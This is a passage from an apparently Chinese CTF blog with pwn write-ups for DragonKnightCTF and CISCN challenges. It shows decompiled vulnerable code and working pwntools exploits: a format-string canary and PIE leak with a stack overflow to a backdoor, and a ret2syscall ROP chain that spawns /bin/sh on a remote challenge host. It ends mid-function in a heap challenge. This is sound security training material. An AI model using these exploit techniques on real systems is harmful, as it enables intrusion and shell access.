    unsigned __int8 v12; &#x2F;&#x2F; [rsp+7h] [rbp-199h]
    int i; &#x2F;&#x2F; [rsp+8h] [rbp-198h]
    unsigned int v14; &#x2F;&#x2F; [rsp+10h] [rbp-190h]
    unsigned int v15; &#x2F;&#x2F; [rsp+14h] [rbp-18Ch]
    char v16[8]; &#x2F;&#x2F; [rsp+18h] [rbp-188h] BYREF
    char nptr[32]; &#x2F;&#x2F; [rsp+20h] [rbp-180h] BYREF
    char v18[32]; &#x2F;&#x2F; [rsp+40h] [rbp-160h] BYREF
    char v19[32]; &#x2F;&#x2F; [rsp+60h] [rbp-140h] BYREF
    char input_data[64]; &#x2F;&#x2F; [rsp+80h] [rbp-120h] BYREF
    __int64 v21[10]; &#x2F;&#x2F; [rsp+C0h] [rbp-E0h] BYREF
    char v22[136]; &#x2F;&#x2F; [rsp+110h] [rbp-90h] BYREF
    unsigned __int64 v23; &#x2F;&#x2F; [rsp+198h] [rbp-8h]

    v23 &#x3D; __readfsqword(0x28u);
    init(argc, argv, envp);
    signal(14, handler);
    v9 &#x3D; 0;
    v10 &#x3D; 0;
    v11 &#x3D; 0;
    v12 &#x3D; 0;
    qmemcpy(v21, &quot;XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC&quot;, sizeof(v21));
    v3 &#x3D; time(0LL);
    srand(v3);
    v8 &#x3D; rand() % 256;
    chal1(input_data, 64);
    if ( strlen(input_data) &gt; 0x32 )
    &#123;
        strcpy(v22, &quot;Out of length.\n&quot;);
        v4 &#x3D; strlen(v22);
        wr1te(1LL, v22, v4);
        exit(1);
    &#125;
    encode(input_data, (__int64)v22);
    for ( i &#x3D; 0; i &lt; 160; ++i )
    &#123;
        v8 &#x3D; lfsr_h(v8);
        if ( i &#x3D;&#x3D; 156 )
            v12 &#x3D; v8;
        if ( i &#x3D;&#x3D; 157 )
            v11 &#x3D; v8;
        if ( i &#x3D;&#x3D; 158 )
            v10 &#x3D; v8;
        if ( i &#x3D;&#x3D; 159 )
            v9 &#x3D; v8;
    &#125;
    if ( (unsigned int)cmp((__int64)v22, (__int64)v21, 0x50uLL) )
    &#123;
        strcpy(v16, &quot;Right!\n&quot;);
        alarm(2u);
        v5 &#x3D; strlen(v16);
        wr1te(1LL, v16, v5);
        strcpy(v19, &quot;Please solve this calculation:\n&quot;);
        v14 &#x3D; (v9 - v10) * v11 % v12;
        printf(&quot;(( %d - %d ) * %d ) %% %d&#x3D;?\n&quot;, v9, v10, v11, v12);
        fgets(nptr, 20, stdin);
        alarm(0);
        v15 &#x3D; atoi(nptr);
        if ( v15 !&#x3D; v14 )
        &#123;
            printf(&quot;You input:%d , but answer:%d&quot;, v15, v14);
            exit(1);
        &#125;
        strcpy(v18, &quot;Right! Here&#39;s your gift:\n&quot;);
        v6 &#x3D; strlen(v18);
        wr1te(1LL, v18, v6);
        gift();
    &#125;
    else
    &#123;
        puts(&quot;Not Right&quot;);
    &#125;
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">__int64 gift()
&#123;
    char format[40]; &#x2F;&#x2F; [rsp+0h] [rbp-30h] BYREF
    unsigned __int64 v2; &#x2F;&#x2F; [rsp+28h] [rbp-8h]

    v2 &#x3D; __readfsqword(0x28u);
    gets(format);
    printf(format);
    fflush(stdout);
    return gets(format);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>base32decode 得到token是DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

static const char base32_alphabet[] &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;;

int base32_lookup(char c) &#123;
    if (c &gt;&#x3D; &#39;A&#39; &amp;&amp; c &lt;&#x3D; &#39;Z&#39;) return c - &#39;A&#39;;
    if (c &gt;&#x3D; &#39;2&#39; &amp;&amp; c &lt;&#x3D; &#39;7&#39;) return c - &#39;2&#39; + 26;
    return -1;
&#125;

void __fastcall decode(char *encoded, char *decoded) &#123;
    int buffer &#x3D; 0;
    int bits_left &#x3D; 0;
    int count &#x3D; 0;
    int length &#x3D; strlen(encoded);

    for (int i &#x3D; 0; i &lt; length; i++) &#123;
        if (encoded[i] &#x3D;&#x3D; &#39;&#x3D;&#39;) break; &#x2F;&#x2F; Padding character

        int val &#x3D; base32_lookup(encoded[i]);
        if (val &#x3D;&#x3D; -1) continue; &#x2F;&#x2F; Skip invalid characters

        buffer &#x3D; (buffer &lt;&lt; 5) | val;
        bits_left +&#x3D; 5;

        if (bits_left &gt;&#x3D; 8) &#123;
            decoded[count++] &#x3D; ~(char)((buffer &gt;&gt; (bits_left - 8)) &amp; 0xFF);
            bits_left -&#x3D; 8;
        &#125;
    &#125;
    decoded[count] &#x3D; &#39;\0&#39;;
&#125;

int main() &#123;
    char encoded[] &#x3D; &quot;XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC&quot;; &#x2F;&#x2F; Example encoded string
    char decoded[256];

    decode(encoded, decoded);

    printf(&quot;Decoded: %s\n&quot;, decoded);

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>式化字符串泄露canary和 elf相关的地址后，计算出backdoor的地址，之后栈溢出覆盖返回地址为backdoor就好了</p>
<p>exp:</p>
<pre class="line-numbers language-none"><code class="language-none">from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)

is_debug &#x3D; 1
IP &#x3D; &quot;challenge.qsnctf.com&quot;
PORT &#x3D; 30604

elf &#x3D; context.binary &#x3D; ELF(&#39;.&#x2F;attachment&#39;)
libc &#x3D; elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g &#x3D; lambda x: gdb.attach(x)
s &#x3D; lambda x: p.send(x)
sl &#x3D; lambda x: p.sendline(x)
sa &#x3D; lambda x, y: p.sendafter(x, y)
sla &#x3D; lambda x, y: p.sendlineafter(x, y)
r &#x3D; lambda x&#x3D;None: p.recv() if x is None else p.recv(x)
rl &#x3D; lambda: p.recvline()
ru &#x3D; lambda x: p.recvuntil(x)
r_leak_libc_64 &#x3D; lambda: u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
r_leak_libc_32 &#x3D; lambda: u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])

p &#x3D; connect()


ru(&quot;Please give me your token: &quot;)

decoded_string &#x3D; &quot;DRKCTF&#123;P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie&#125;&quot;
sl(decoded_string)

ru(&quot;(( &quot;)
a &#x3D; int(ru(&#39;-&#39;)[:-2])
b &#x3D; int(ru(&#39; )&#39;)[:-2])
ru(&#39;* &#39;)
c &#x3D; int(ru(&#39; )&#39;)[:-2])
ru(&#39;% &#39;)
d &#x3D; int(ru(&#39;&#x3D;&#39;)[:-1])

result &#x3D; ((a - b) * c) %d
sl(str(result))

ru(&quot;Right! Here&#39;s your gift:\n&quot;)

payload &#x3D; &quot;--%11$p---%8$p&quot;
# g(p)
sl(payload)
ru(&#39;--&#39;)
canary &#x3D; int(r(18),16)
ru(&#39;---&#39;)
pie &#x3D; int(r(14),16) - (0x62fadaae3bd7 - 0x62fadaae2000)

success(hex(canary))
success(hex(pie))


backdoor &#x3D; pie + 0x0000000000001426
payload &#x3D; b&#39;a&#39; * 0x28 + p64(canary) + b&#39;a&#39; * 8 + p64(backdoor)
sl(payload)


p.interactive()

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2>
	
	</div>
  <a type="button" href="/2024/05/27/DragonKnightCTF-pwn/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/05/22/ciscn-pwn/" >ciscn_pwn</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-05-22  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><p>栈溢出，存在一个可以执行的命令的backdoor函数，用了下有些问题，就打ret2syscall了，栈上有一个strings结构体要伪造一下，syscall read到一个可以写的段，写binsh然后syscall execve getshell</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"8.147.133.9"</span>
PORT <span class="token operator">=</span> <span class="token number">17425</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./gostack'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


rax <span class="token operator">=</span> <span class="token number">0x000000000040f984</span>
rdi_r14_r13_r12_rbp_rbx <span class="token operator">=</span> <span class="token number">0x00000000004a18a5</span>
rsi <span class="token operator">=</span> <span class="token number">0x000000000042138a</span>
rdx <span class="token operator">=</span> <span class="token number">0x00000000004944ec</span>
syscall <span class="token operator">=</span> <span class="token number">0x0000000000404043</span>
bss <span class="token operator">=</span> <span class="token number">0x564000</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x100</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x90</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi_r14_r13_r12_rbp_rbx<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi_r14_r13_r12_rbp_rbx<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
<span class="token comment"># g(p)</span>


time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>




p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_B26</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello, I'm delighted to meet you. Please tell me your name."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x1FuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sweet %s, please record your daily stories.\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      choice <span class="token operator">=</span> <span class="token function">get_choice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\n##orange_cat_diary##\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1.Add diary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2.Show diary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3.Delete diary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4.Edit diary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5.Exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your choice:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">sub_DE9</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_202014 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> dword_202058<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">--</span>dword_202014<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Diary view successful."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">sub_D83</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_202010 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">--</span>dword_202010<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Diary deletion successful."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">sub_CD9</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch]</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input the length of the diary content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  choice <span class="token operator">=</span> <span class="token function">get_choice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_202058 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>choice <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The diary content exceeds the maximum length allowed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please enter the diary content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Diary modification successful."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">sub_BF5</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch]</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input the length of the diary content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  choice <span class="token operator">=</span> <span class="token function">get_choice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>choice <span class="token operator">></span> <span class="token number">0x1000</span> <span class="token punctuation">)</span>
